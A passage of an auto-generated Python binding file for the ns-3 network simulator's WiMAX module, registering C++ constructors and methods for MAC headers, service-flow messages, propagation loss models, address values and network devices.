'uint8_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetBr',
'void',
[param('uint32_t', 'br')])
cls.add_method('SetCid',
'void',
[param('ns3::Cid', 'cid')])
cls.add_method('SetEc',
'void',
[param('uint8_t', 'ec')])
cls.add_method('SetHcs',
'void',
[param('uint8_t', 'hcs')])
cls.add_method('SetHt',
'void',
[param('uint8_t', 'HT')])
cls.add_method('SetType',
'void',
[param('uint8_t', 'type')])
cls.add_method('check_hcs',
'bool',
[],
is_const=True)
return
def register_Ns3BsServiceFlowManager_methods(root_module, cls):
cls.add_constructor([param('ns3::BsServiceFlowManager const &', 'arg0')])
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'device')])
cls.add_method('AddMulticastServiceFlow',
'void',
[param('ns3::ServiceFlow', 'sf'), param('ns3::WimaxPhy::ModulationType', 'modulation')])
cls.add_method('AddServiceFlow',
'void',
[param('ns3::ServiceFlow *', 'serviceFlow')])
cls.add_method('AllocateServiceFlows',
'void',
[param('ns3::DsaReq const &', 'dsaReq'), param('ns3::Cid', 'cid')])
cls.add_method('DoDispose',
'void',
[],
is_virtual=True)
cls.add_method('GetDsaAckTimeoutEvent',
'ns3::EventId',
[],
is_const=True)
cls.add_method('GetServiceFlow',
'ns3::ServiceFlow *',
[param('uint32_t', 'sfid')],
is_const=True)
cls.add_method('GetServiceFlow',
'ns3::ServiceFlow *',
[param('ns3::Cid', 'cid')],
is_const=True)
cls.add_method('GetServiceFlows',
'std::vector< ns3::ServiceFlow * >',
[param('ns3::ServiceFlow::SchedulingType', 'schedulingType')],
is_const=True)
cls.add_method('ProcessDsaAck',
'void',
[param('ns3::DsaAck const &', 'dsaAck'), param('ns3::Cid', 'cid')])
cls.add_method('ProcessDsaReq',
'ns3::ServiceFlow *',
[param('ns3::DsaReq const &', 'dsaReq'), param('ns3::Cid', 'cid')])
cls.add_method('SetMaxDsaRspRetries',
'void',
[param('uint8_t', 'maxDsaRspRetries')])
return
def register_Ns3CallbackChecker_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::CallbackChecker const &', 'arg0')])
return
def register_Ns3CallbackImplBase_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::CallbackImplBase const &', 'arg0')])
cls.add_method('IsEqual',
'bool',
[param('ns3::Ptr< ns3::CallbackImplBase const >', 'other')],
is_pure_virtual=True, is_const=True, is_virtual=True)
return
def register_Ns3CallbackValue_methods(root_module, cls):
cls.add_constructor([param('ns3::CallbackValue const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::CallbackBase const &', 'base')])
cls.add_method('Copy',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_const=True, is_virtual=True)
cls.add_method('DeserializeFromString',
'bool',
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_virtual=True)
cls.add_method('SerializeToString',
'std::string',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_const=True, is_virtual=True)
cls.add_method('Set',
'void',
[param('ns3::CallbackBase', 'base')])
return
def register_Ns3Channel_methods(root_module, cls):
cls.add_constructor([param('ns3::Channel const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetDevice',
'ns3::Ptr< ns3::NetDevice >',
[param('uint32_t', 'i')],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetId',
'uint32_t',
[],
is_const=True)
cls.add_method('GetNDevices',
'uint32_t',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
return
def register_Ns3ConnectionManager_methods(root_module, cls):
cls.add_constructor([param('ns3::ConnectionManager const &', 'arg0')])
cls.add_constructor([])
cls.add_method('AddConnection',
'void',
[param('ns3::Ptr< ns3::WimaxConnection >', 'connection'), param('ns3::Cid::Type', 'type')])
cls.add_method('AllocateManagementConnections',
'void',
[param('ns3::SSRecord *', 'ssRecord'), param('ns3::RngRsp *', 'rngrsp')])
cls.add_method('CreateConnection',
'ns3::Ptr< ns3::WimaxConnection >',
[param('ns3::Cid::Type', 'type')])
cls.add_method('DoDispose',
'void',
[],
is_virtual=True)
cls.add_method('GetConnection',
'ns3::Ptr< ns3::WimaxConnection >',
[param('ns3::Cid', 'cid')])
cls.add_method('GetConnections',
'std::vector< ns3::Ptr< ns3::WimaxConnection > >',
[param('ns3::Cid::Type', 'type')],
is_const=True)
cls.add_method('GetNPackets',
'uint32_t',
[param('ns3::Cid::Type', 'type'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType')],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('HasPackets',
'bool',
[],
is_const=True)
cls.add_method('SetCidFactory',
'void',
[param('ns3::CidFactory *', 'cidFactory')])
return
def register_Ns3Dcd_methods(root_module, cls):
cls.add_constructor([param('ns3::Dcd const &', 'arg0')])
cls.add_constructor([])
cls.add_method('AddDlBurstProfile',
'void',
[param('ns3::OfdmDlBurstProfile', 'dlBurstProfile')])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetChannelEncodings',
'ns3::OfdmDcdChannelEncodings',
[],
is_const=True)
cls.add_method('GetConfigurationChangeCount',
'uint8_t',
[],
is_const=True)
cls.add_method('GetDlBurstProfiles',
'std::vector< ns3::OfdmDlBurstProfile >',
[],
is_const=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetNrDlBurstProfiles',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetChannelEncodings',
'void',
[param('ns3::OfdmDcdChannelEncodings', 'channelEncodings')])
cls.add_method('SetConfigurationChangeCount',
'void',
[param('uint8_t', 'configurationChangeCount')])
cls.add_method('SetNrDlBurstProfiles',
'void',
[param('uint8_t', 'nrDlBurstProfiles')])
return
def register_Ns3DlMap_methods(root_module, cls):
cls.add_constructor([param('ns3::DlMap const &', 'arg0')])
cls.add_constructor([])
cls.add_method('AddDlMapElement',
'void',
[param('ns3::OfdmDlMapIe', 'dlMapElement')])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetBaseStationId',
'ns3::Mac48Address',
[],
is_const=True)
cls.add_method('GetDcdCount',
'uint8_t',
[],
is_const=True)
cls.add_method('GetDlMapElements',
'std::list< ns3::OfdmDlMapIe >',
[],
is_const=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetBaseStationId',
'void',
[param('ns3::Mac48Address', 'baseStationID')])
cls.add_method('SetDcdCount',
'void',
[param('uint8_t', 'dcdCount')])
return
def register_Ns3DsaAck_methods(root_module, cls):
cls.add_constructor([param('ns3::DsaAck const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetConfirmationCode',
'uint16_t',
[],
is_const=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTransactionId',
'uint16_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetConfirmationCode',
'void',
[param('uint16_t', 'confirmationCode')])
cls.add_method('SetTransactionId',
'void',
[param('uint16_t', 'transactionId')])
return
def register_Ns3DsaReq_methods(root_module, cls):
cls.add_constructor([param('ns3::DsaReq const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::ServiceFlow', 'sf')])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetCid',
'ns3::Cid',
[],
is_const=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetServiceFlow',
'ns3::ServiceFlow',
[],
is_const=True)
cls.add_method('GetSfid',
'uint32_t',
[],
is_const=True)
cls.add_method('GetTransactionId',
'uint16_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetCid',
'void',
[param('ns3::Cid', 'cid')])
cls.add_method('SetServiceFlow',
'void',
[param('ns3::ServiceFlow', 'sf')])
cls.add_method('SetSfid',
'void',
[param('uint32_t', 'sfid')])
cls.add_method('SetTransactionId',
'void',
[param('uint16_t', 'transactionId')])
return
def register_Ns3DsaRsp_methods(root_module, cls):
cls.add_constructor([param('ns3::DsaRsp const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetCid',
'ns3::Cid',
[],
is_const=True)
cls.add_method('GetConfirmationCode',
'uint16_t',
[],
is_const=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetServiceFlow',
'ns3::ServiceFlow',
[],
is_const=True)
cls.add_method('GetSfid',
'uint32_t',
[],
is_const=True)
cls.add_method('GetTransactionId',
'uint16_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetCid',
'void',
[param('ns3::Cid', 'cid')])
cls.add_method('SetConfirmationCode',
'void',
[param('uint16_t', 'confirmationCode')])
cls.add_method('SetServiceFlow',
'void',
[param('ns3::ServiceFlow', 'sf')])
cls.add_method('SetSfid',
'void',
[param('uint32_t', 'sfid')])
cls.add_method('SetTransactionId',
'void',
[param('uint16_t', 'transactionId')])
return
def register_Ns3EmptyAttributeValue_methods(root_module, cls):
cls.add_constructor([param('ns3::EmptyAttributeValue const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Copy',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_const=True, visibility='private', is_virtual=True)
cls.add_method('DeserializeFromString',
'bool',
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
visibility='private', is_virtual=True)
cls.add_method('SerializeToString',
'std::string',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3EventImpl_methods(root_module, cls):
cls.add_constructor([param('ns3::EventImpl const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Cancel',
'void',
[])
cls.add_method('Invoke',
'void',
[])
cls.add_method('IsCancelled',
'bool',
[])
cls.add_method('Notify',
'void',
[],
is_pure_virtual=True, visibility='protected', is_virtual=True)
return
def register_Ns3FixedRssLossModel_methods(root_module, cls):
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_constructor([])
cls.add_method('SetRss',
'void',
[param('double', 'rss')])
cls.add_method('DoCalcRxPower',
'double',
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],
is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3FragmentationSubheader_methods(root_module, cls):
cls.add_constructor([param('ns3::FragmentationSubheader const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetFc',
'uint8_t',
[],
is_const=True)
cls.add_method('GetFsn',
'uint8_t',
[],
is_const=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetFc',
'void',
[param('uint8_t', 'fc')])
cls.add_method('SetFsn',
'void',
[param('uint8_t', 'fsn')])
return
def register_Ns3FriisPropagationLossModel_methods(root_module, cls):
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_constructor([])
cls.add_method('SetLambda',
'void',
[param('double', 'frequency'), param('double', 'speed')])
cls.add_method('SetLambda',
'void',
[param('double', 'lambda')])
cls.add_method('SetSystemLoss',
'void',
[param('double', 'systemLoss')])
cls.add_method('SetMinDistance',
'void',
[param('double', 'minDistance')])
cls.add_method('GetMinDistance',
'double',
[],
is_const=True)
cls.add_method('GetLambda',
'double',
[],
is_const=True)
cls.add_method('GetSystemLoss',
'double',
[],
is_const=True)
cls.add_method('DoCalcRxPower',
'double',
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],
is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3GenericMacHeader_methods(root_module, cls):
cls.add_constructor([param('ns3::GenericMacHeader const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetCi',
'uint8_t',
[],
is_const=True)
cls.add_method('GetCid',
'ns3::Cid',
[],
is_const=True)
cls.add_method('GetEc',
'uint8_t',
[],
is_const=True)
cls.add_method('GetEks',
'uint8_t',
[],
is_const=True)
cls.add_method('GetHcs',
'uint8_t',
[],
is_const=True)
cls.add_method('GetHt',
'uint8_t',
[],
is_const=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetLen',
'uint16_t',
[],
is_const=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetType',
'uint8_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetCi',
'void',
[param('uint8_t', 'ci')])
cls.add_method('SetCid',
'void',
[param('ns3::Cid', 'cid')])
cls.add_method('SetEc',
'void',
[param('uint8_t', 'ec')])
cls.add_method('SetEks',
'void',
[param('uint8_t', 'eks')])
cls.add_method('SetHcs',
'void',
[param('uint8_t', 'hcs')])
cls.add_method('SetHt',
'void',
[param('uint8_t', 'HT')])
cls.add_method('SetLen',
'void',
[param('uint16_t', 'len')])
cls.add_method('SetType',
'void',
[param('uint8_t', 'type')])
cls.add_method('check_hcs',
'bool',
[],
is_const=True)
return
def register_Ns3GrantManagementSubheader_methods(root_module, cls):
cls.add_constructor([param('ns3::GrantManagementSubheader const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetPbr',
'uint16_t',
[],
is_const=True)
cls.add_method('GetPm',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetSi',
'uint8_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetPbr',
'void',
[param('uint16_t', 'pbr')])
cls.add_method('SetPm',
'void',
[param('uint8_t', 'pm')])
cls.add_method('SetSi',
'void',
[param('uint8_t', 'si')])
return
def register_Ns3IpcsClassifier_methods(root_module, cls):
cls.add_constructor([param('ns3::IpcsClassifier const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Classify',
'ns3::ServiceFlow *',
[param('ns3::Ptr< ns3::Packet const >', 'packet'), param('ns3::Ptr< ns3::ServiceFlowManager >', 'sfm'), param('ns3::ServiceFlow::Direction', 'dir')])
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
return
def register_Ns3Ipv4AddressChecker_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::Ipv4AddressChecker const &', 'arg0')])
return
def register_Ns3Ipv4AddressValue_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::Ipv4AddressValue const &', 'arg0')])
cls.add_constructor([param('ns3::Ipv4Address const &', 'value')])
cls.add_method('Copy',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_const=True, is_virtual=True)
cls.add_method('DeserializeFromString',
'bool',
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_virtual=True)
cls.add_method('Get',
'ns3::Ipv4Address',
[],
is_const=True)
cls.add_method('SerializeToString',
'std::string',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_const=True, is_virtual=True)
cls.add_method('Set',
'void',
[param('ns3::Ipv4Address const &', 'value')])
return
def register_Ns3Ipv4MaskChecker_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::Ipv4MaskChecker const &', 'arg0')])
return
def register_Ns3Ipv4MaskValue_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::Ipv4MaskValue const &', 'arg0')])
cls.add_constructor([param('ns3::Ipv4Mask const &', 'value')])
cls.add_method('Copy',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_const=True, is_virtual=True)
cls.add_method('DeserializeFromString',
'bool',
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_virtual=True)
cls.add_method('Get',
'ns3::Ipv4Mask',
[],
is_const=True)
cls.add_method('SerializeToString',
'std::string',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_const=True, is_virtual=True)
cls.add_method('Set',
'void',
[param('ns3::Ipv4Mask const &', 'value')])
return
def register_Ns3Ipv6AddressChecker_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::Ipv6AddressChecker const &', 'arg0')])
return
def register_Ns3Ipv6AddressValue_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::Ipv6AddressValue const &', 'arg0')])
cls.add_constructor([param('ns3::Ipv6Address const &', 'value')])
cls.add_method('Copy',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_const=True, is_virtual=True)
cls.add_method('DeserializeFromString',
'bool',
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_virtual=True)
cls.add_method('Get',
'ns3::Ipv6Address',
[],
is_const=True)
cls.add_method('SerializeToString',
'std::string',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_const=True, is_virtual=True)
cls.add_method('Set',
'void',
[param('ns3::Ipv6Address const &', 'value')])
return
def register_Ns3Ipv6PrefixChecker_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::Ipv6PrefixChecker const &', 'arg0')])
return
def register_Ns3Ipv6PrefixValue_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::Ipv6PrefixValue const &', 'arg0')])
cls.add_constructor([param('ns3::Ipv6Prefix const &', 'value')])
cls.add_method('Copy',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_const=True, is_virtual=True)
cls.add_method('DeserializeFromString',
'bool',
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_virtual=True)
cls.add_method('Get',
'ns3::Ipv6Prefix',
[],
is_const=True)
cls.add_method('SerializeToString',
'std::string',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_const=True, is_virtual=True)
cls.add_method('Set',
'void',
[param('ns3::Ipv6Prefix const &', 'value')])
return
def register_Ns3LogDistancePropagationLossModel_methods(root_module, cls):
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_constructor([])
cls.add_method('SetPathLossExponent',
'void',
[param('double', 'n')])
cls.add_method('GetPathLossExponent',
'double',
[],
is_const=True)
cls.add_method('SetReference',
'void',
[param('double', 'referenceDistance'), param('double', 'referenceLoss')])
cls.add_method('DoCalcRxPower',
'double',
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],
is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3Mac48AddressChecker_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::Mac48AddressChecker const &', 'arg0')])
return
def register_Ns3Mac48AddressValue_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::Mac48AddressValue const &', 'arg0')])
cls.add_constructor([param('ns3::Mac48Address const &', 'value')])
cls.add_method('Copy',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_const=True, is_virtual=True)
cls.add_method('DeserializeFromString',
'bool',
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_virtual=True)
cls.add_method('Get',
'ns3::Mac48Address',
[],
is_const=True)
cls.add_method('SerializeToString',
'std::string',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_const=True, is_virtual=True)
cls.add_method('Set',
'void',
[param('ns3::Mac48Address const &', 'value')])
return
def register_Ns3MatrixPropagationLossModel_methods(root_module, cls):
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_constructor([])
cls.add_method('SetLoss',
'void',
[param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b'), param('double', 'loss'), param('bool', 'symmetric', default_value='true')])
cls.add_method('SetDefaultLoss',
'void',
[param('double', 'arg0')])
cls.add_method('DoCalcRxPower',
'double',
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],
is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3NakagamiPropagationLossModel_methods(root_module, cls):
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_constructor([])
cls.add_method('DoCalcRxPower',
'double',
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],
is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3NetDevice_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::NetDevice const &', 'arg0')])
cls.add_method('AddLinkChangeCallback',
'void',
[param('ns3::Callback< void, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'callback')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('GetAddress',
'ns3::Address',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetBroadcast',
'ns3::Address',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetChannel',
'ns3::Ptr< ns3::Channel >',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetIfIndex',
'uint32_t',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetMtu',
'uint16_t',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetMulticast',
'ns3::Address',
[param('ns3::Ipv4Address', 'multicastGroup')],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetMulticast',
'ns3::Address',
[param('ns3::Ipv6Address', 'addr')],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetNode',
'ns3::Ptr< ns3::Node >',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('IsBridge',
'bool',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('IsBroadcast',
'bool',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('IsLinkUp',
'bool',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('IsMulticast',
'bool',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('IsPointToPoint',
'bool',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('NeedsArp',
'bool',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('Send',
'bool',
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Address const &', 'dest'), param('uint16_t', 'protocolNumber')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SendFrom',
'bool',
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Address const &', 'source'), param('ns3::Address const &', 'dest'), param('uint16_t', 'protocolNumber')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SetAddress',
'void',
[param('ns3::Address', 'address')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SetIfIndex',
'void',
[param('uint32_t const', 'index')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SetMtu',
'bool',
[param('uint16_t const', 'mtu')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SetNode',
'void',
[param('ns3::Ptr< ns3::Node >', 'node')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SetPromiscReceiveCallback',
'void',
[param('ns3::Callback< bool, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::Address const &, ns3::NetDevice::PacketType, ns3::empty, ns3::empty, ns3::empty >', 'cb')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SetReceiveCallback',
'void',
[param('ns3::Callback< bool, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'cb')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SupportsSendFrom',
'bool',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
return
def register_Ns3NixVector_methods(root_module, cls):
cls.add_output_stream_operator()
cls.add_constructor([])
cls.add_constructor([param('ns3::NixVector const &', 'o')])
cls.add_method('AddNeighborIndex',
'void',
[param('uint32_t', 'newBits'), param('uint32_t', 'numberOfBits')])
cls.add_method('BitCount',
'uint32_t',
[param('uint32_t', 'numberOfNeighbors')],
is_const=True)
cls.add_method('Copy',
'ns3::Ptr< ns3::NixVector >',
[],
is_const=True)
cls.add_method('Deserialize',
'uint32_t',
[param('uint32_t const *', 'buffer'), param('uint32_t', 'size')])
cls.add_method('ExtractNeighborIndex',
'uint32_t',
[param('uint32_t', 'numberOfBits')])
cls.add_method('GetRemainingBits',
'uint32_t',
[])
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True)
cls.add_method('Serialize',
'uint32_t',
[param('uint32_t *', 'buffer'), param('uint32_t', 'maxSize')],
is_const=True)
return
def register_Ns3Node_methods(root_module, cls):
cls.add_constructor([param('ns3::Node const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('uint32_t', 'systemId')])
cls.add_method('AddApplication',
'uint32_t',
[param('ns3::Ptr< ns3::Application >', 'application')])
cls.add_method('AddDevice',
'uint32_t',
[param('ns3::Ptr< ns3::NetDevice >', 'device')])
cls.add_method('ChecksumEnabled',
'bool',
[],
is_static=True)
cls.add_method('GetApplication',
'ns3::Ptr< ns3::Application >',
[param('uint32_t', 'index')],
